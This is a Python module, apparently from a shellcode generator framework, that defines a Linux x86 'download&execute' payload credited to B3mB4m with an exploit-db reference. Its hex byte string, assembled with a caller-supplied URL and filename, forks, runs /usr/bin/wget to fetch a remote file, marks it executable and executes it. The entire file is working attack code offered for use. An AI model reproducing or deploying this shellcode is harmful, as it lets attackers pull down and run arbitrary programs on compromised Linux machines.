from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "B3mB4m"
    Shellcode.info["name"] = "Linux86 - download&execute shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/39389/"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = \
            101 + Shellcode().getsize(kwargs["filename"]) * 2 + Shellcode().getsize([kwargs["url"]])
        Shellcode.info["payload"] = [
            r"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74"
            r"\x3b\x31\xc9\x31\xdb\x31\xc0\x6a\x05\x89\xe1"
            r"\x89\xe1\x89\xe3\xb0\xa2\xcd\x80\x31\xc9\x31"
            r"\xc0\x50\xb0\x0f"
            + kwargs["filename"] +
            r"\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31"
            r"\xc0\x50"
            + kwargs["filename"] +
            r"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd"
            r"\x80\x31\xc0\x40\xcd\x80\x6a\x0b\x58\x99\x52"
            + kwargs["url"] +
            r"\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68"
            r"\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3"
            r"\x52\x51\x53\x89\xe1\xcd\x80"

        ]
